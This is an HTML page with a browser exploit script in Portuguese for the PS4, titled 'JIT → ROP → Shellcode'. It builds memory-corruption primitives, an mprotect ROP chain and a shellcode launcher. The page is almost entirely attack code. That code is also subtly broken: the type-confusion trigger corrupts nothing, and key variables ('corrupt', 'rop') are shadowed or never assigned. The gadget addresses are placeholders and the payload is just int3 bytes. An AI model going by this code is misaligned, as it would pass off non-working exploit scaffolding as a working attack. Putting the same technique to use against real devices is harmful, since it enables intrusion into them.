<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PS4 JIT → ROP → Shellcode</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 10px; white-space: pre-wrap; }
    #log { max-height: 80vh; overflow-y: auto; }
  </style>
</head>
<body>
  <h1>Exploit PS4: JIT → ROP → Shellcode</h1>
  <div id="log">inicializando…</div>
  <script>
    const logEl = document.getElementById('log');
    let logData = "";
    function log(msg) {
      logData += msg + "\n";
      logEl.textContent = logData;
      logEl.scrollTop = logEl.scrollHeight;
    }

    //–– primitives float↔int
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    function f2i(f){ f64[0]=f; return BigInt(u32[0]) + (BigInt(u32[1])<<32n); }
    function i2f(i){ u32[0]=Number(i & 0xffffffffn); u32[1]=Number(i>>32n); return f64[0]; }

    //–– 1) Type-confusion gadget para corromper length
    function makeCorruptArray() {
      let arr = [1.1,1.1,1.1];
      let trigger = { valueOf(){ arr.length = 1; return 3; } };
      return arr.map((x,i,a)=>{ if(i===1) a.length = trigger; return x; });
    }

    //–– 2) build addrof/fakeobj/arb_read/arb_write
    let addrof, fakeobj, arb_read, arb_write;
    function setupPrimitives() {
      log("[+] setupPrimitives()");
      const corrupt = makeCorruptArray();
      log("    corrupt[1] (leak) = "+ corrupt[1]);
      let leak = f2i(corrupt[1]);
      log("    backing ptr leak = 0x"+leak.toString(16));
      // victim buffer whose backing ptr we control via corrupt[1]
      let victim_buf = new ArrayBuffer(0x2000);
      let victim_f64 = new Float64Array(victim_buf);

      // redireciona corrupt[1] para apontar ao backing-ptr de victim_buf
      corrupt[1] = i2f(leak);

      addrof = obj => {
        victim_f64[0] = obj;               // write obj ref into backing
        return f2i(corrupt[1]);            // leak its “address”
      };
      fakeobj = addr => {
        corrupt[1] = i2f(addr);            // apontar backing ptr para addr
        return new Float64Array(victim_buf)[0]; 
      };
      arb_read = addr => {
        corrupt[1] = i2f(addr);
        return f2i(victim_f64[1]);
      };
      arb_write = (addr,val) => {
        corrupt[1] = i2f(addr);
        victim_f64[1] = i2f(val);
      };

      log("    primitivas configuradas");  
    }

    //–– 3) ROPChain com mprotect
    let shellcodeAddr;
    function buildROP() {
      log("[+] buildROP()");
      // alocar um ArrayBuffer grande para shellcode
      let sc_buf = new ArrayBuffer(0x1000);
      shellcodeAddr = f2i(corrupt[1]); // backing ptr de sc_buf
      log("    shellcode buffer @ 0x"+shellcodeAddr.toString(16));

      // gadgets (endereços fictícios — substitua pelos reais após leak)
      let pop_rdi = 0x10001000n;
      let pop_rsi = 0x10002000n;
      let pop_rdx = 0x10003000n;
      let mprotect_syscall = 0x10004000n;
      // ROPChain:
      let rop = [
        pop_rdi,               // rdi = addr
        shellcodeAddr,
        pop_rsi,               // rsi = size
        0x1000n,
        pop_rdx,               // rdx = perms
        7n,
        mprotect_syscall,      // call mprotect(rdi,rsi,rdx)
        shellcodeAddr          // ret → shellcode
      ];
      // escreve ROPChain no início do sc_buf
      let dv = new DataView(sc_buf);
      for(let i=0;i<rop.length;i++){
        let v = rop[i];
        dv.setBigUint64(i*8, v, true);
      }
      log("    ROPChain escrita no buffer");
      return sc_buf;
    }

    //–– 4) injeta shellcode e dispara
    function injectAndRun(sc_buf) {
      log("[+] injectAndRun()");
      // exemplo de shellcode x86_64: int3; int3; int3; int3
      const shellcode = new Uint8Array([0xCC,0xCC,0xCC,0xCC]);
      // copia shellcode após ROPChain
      let dv = new DataView(sc_buf);
      for(let i=0;i<shellcode.length;i++){
        dv.setUint8(rop.length*8 + i, shellcode[i]);
      }
      log("    shellcode injetado ("+shellcode.length+" bytes)");

      // agora chamamos fakeobj(shellcodeAddr) como função
      try {
        let fn = fakeobj(shellcodeAddr);
        log("    chamando shellcode...");
        fn();   // deve saltar para shellcode → INT3
      } catch(e) {
        log("    shellcode trigger retornou/explodiu: " + e);
      }
    }

    //–– run everything
    let corrupt;
    let rop;
    setTimeout(()=>{
      try {
        log("=== Exploit start ===");
        setupPrimitives();
        let sc_buf = buildROP();
        injectAndRun(sc_buf);
        log("=== fim ===");
      } catch(e) {
        log("!!! erro exploit: " + e);
      }
    }, 1000);
  </script>
</body>
</html>
